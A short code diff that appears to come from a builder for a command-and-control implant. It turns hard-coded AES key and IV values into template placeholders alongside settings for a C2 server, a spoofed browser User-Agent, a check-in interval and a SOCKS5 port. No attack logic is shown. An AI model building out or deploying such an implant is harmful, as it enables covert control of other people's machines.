@@ -99,8 +99,8 @@ except ImportError as e:
 class Config:
     def __init__(self):
         self.C2_SERVER = "{server_url}"
-        self.AES_KEY = b"32bytekey-ultra-secure-123456789"
-        self.AES_IV = b"16byteiv-9876543"
+        self.AES_KEY = {aes_key}
+        self.AES_IV = {aes_iv}
         self.USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
         self.CHECKIN_INTERVAL = {checkin_interval}
         self.SOCKS5_PORT = 1080
